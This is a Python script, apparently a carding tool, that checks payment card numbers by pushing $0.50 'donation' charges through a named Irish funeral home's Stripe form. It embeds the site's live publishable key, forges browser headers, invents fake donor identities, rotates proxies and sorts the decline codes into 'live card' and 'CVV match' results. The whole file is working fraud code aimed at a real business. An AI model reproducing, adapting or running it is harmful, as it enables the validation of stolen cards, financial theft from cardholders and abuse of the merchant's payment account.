"""
Corrigan Funerals - Stripe Donation Gate ($0.50)
WordPress Full Stripe inline donation form - Full charge flow
"""
import requests
import random
from typing import Tuple
from faker import Faker


STRIPE_PK = 'pk_live_51IGU0GIHh0fd2MZ32oi6r6NEUMy1GP19UVxwpXGlx3VagMJJOS0EM4e6moTZ4TUCFdX2HLlqns5dQJEx42rvhlfg003wK95g5r'


def corrigan_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy: dict = None) -> Tuple[str, bool]:
    """
    Check card via Corrigan Funerals donation form.
    Amount: $0.50 donation - Full charge flow
    
    Returns:
        Tuple[str, bool]: (response_message, proxy_alive)
    """
    fake = Faker()
    site_name = 'corrigan'
    
    try:
        session = requests.Session()
        session.verify = False
        timeout = 20
        
        if proxy:
            session.proxies.update(proxy)
        
        yy = card_yer.strip()
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        
        name = fake.name()
        email = fake.email()
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]={name.replace(" ", "+")}&card[number]={card_num}&card[cvc]={card_cvc}&card[exp_month]={card_mon}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key={STRIPE_PK}'
        
        response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=timeout)
        
        if response.status_code == 402:
            resp = response.json()
            error = resp.get('error', {})
            code = error.get('code', '')
            decline_code = error.get('decline_code', '')
            message = error.get('message', 'Card declined')
            
            if decline_code == 'insufficient_funds':
                return (f"CCN ✅|{site_name}|CVV Match - Insufficient Funds|{card_num[-4:]}", True)
            elif code == 'incorrect_cvc' or code == 'invalid_cvc' or 'security code' in message.lower():
                return (f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{card_num[-4:]}", True)
            elif decline_code in ['lost_card', 'stolen_card']:
                return (f"DECLINED ❌|{site_name}|{decline_code.replace('_', ' ').title()}|{card_num[-4:]}", True)
            elif decline_code == 'expired_card' or 'expired' in message.lower():
                return (f"DECLINED ❌|{site_name}|Expired Card|{card_num[-4:]}", True)
            elif decline_code == 'do_not_honor':
                return (f"DECLINED ❌|{site_name}|Do Not Honor|{card_num[-4:]}", True)
            elif decline_code == 'fraudulent':
                return (f"DECLINED ❌|{site_name}|Fraudulent|{card_num[-4:]}", True)
            elif decline_code == 'generic_decline':
                return (f"DECLINED ❌|{site_name}|Generic Decline|{card_num[-4:]}", True)
            else:
                return (f"DECLINED ❌|{site_name}|{decline_code or message[:30]}|{card_num[-4:]}", True)
        
        try:
            pm = response.json()['id']
        except (KeyError, ValueError):
            error_msg = response.json().get('error', {}).get('message', 'Invalid card')
            return (f"DECLINED ❌|{site_name}|{error_msg[:40]}|{card_num[-4:]}", True)
        
        headers = {
            'authority': 'www.corriganfunerals.ie',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.corriganfunerals.ie',
            'referer': 'https://www.corriganfunerals.ie/pay-funeral-account/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        first_name = name.split()[0] if ' ' in name else name
        last_name = name.split()[-1] if ' ' in name else 'Donor'
        
        data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'pay-funeral-account',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.50',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-custom-input[]': [first_name, last_name, name],
            'wpfs-card-holder-email': email,
            'wpfs-card-holder-name': name,
            'wpfs-stripe-payment-method-id': pm,
        }
        
        response = session.post('https://www.corriganfunerals.ie/cfajax', headers=headers, data=data, timeout=timeout)
        
        try:
            resp_json = response.json()
            result = resp_json.get('message', response.text)
            success_flag = resp_json.get('success', False)
        except:
            result = response.text
            success_flag = False
        
        result_lower = result.lower() if isinstance(result, str) else str(result).lower()
        
        print(f"[DEBUG] Corrigan response: status={response.status_code}, success={success_flag}, result={result[:200] if len(str(result)) > 200 else result}")
        
        if 'insufficient_funds' in result_lower:
            return (f"CCN ✅|{site_name}|CVV Match - Insufficient Funds|{card_num[-4:]}", True)
        if 'incorrect_cvc' in result_lower or 'security code' in result_lower or 'cvc' in result_lower:
            return (f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{card_num[-4:]}", True)
        if 'do_not_honor' in result_lower:
            return (f"DECLINED ❌|{site_name}|Do Not Honor|{card_num[-4:]}", True)
        if 'card_declined' in result_lower or 'declined' in result_lower:
            return (f"DECLINED ❌|{site_name}|Card Declined|{card_num[-4:]}", True)
        if 'expired' in result_lower:
            return (f"DECLINED ❌|{site_name}|Expired Card|{card_num[-4:]}", True)
        if 'fraudulent' in result_lower:
            return (f"DECLINED ❌|{site_name}|Fraud Detected|{card_num[-4:]}", True)
        if 'generic_decline' in result_lower:
            return (f"DECLINED ❌|{site_name}|Generic Decline|{card_num[-4:]}", True)
        if 'requires_action' in result_lower or '3d_secure' in result_lower:
            return (f"APPROVED ✅|{site_name}|3DS Required - CVV Match|{card_num[-4:]}", True)
        
        if success_flag is True or any(kw in result_lower for kw in ['succeeded', 'success', 'thank you', 'approved', 'complete', 'payment received']):
            return (f"APPROVED ✅|{site_name}|CVV Match - Charged $0.50|{card_num[-4:]}", True)
        
        if 'error' in result_lower or 'failed' in result_lower:
            return (f"DECLINED ❌|{site_name}|Transaction Failed|{card_num[-4:]}", True)
        
        return (f"UNKNOWN ⚠️|{site_name}|Response Unrecognized|{card_num[-4:]}", True)
            
    except requests.exceptions.Timeout:
        return (f"DECLINED ❌|{site_name}|Request Timeout|{card_num[-4:]}", False)
    except requests.exceptions.ProxyError:
        return (f"DECLINED ❌|{site_name}|Proxy Error|{card_num[-4:]}", False)
    except Exception as e:
        return (f"DECLINED ❌|{site_name}|{str(e)[:40]}|{card_num[-4:]}", True)
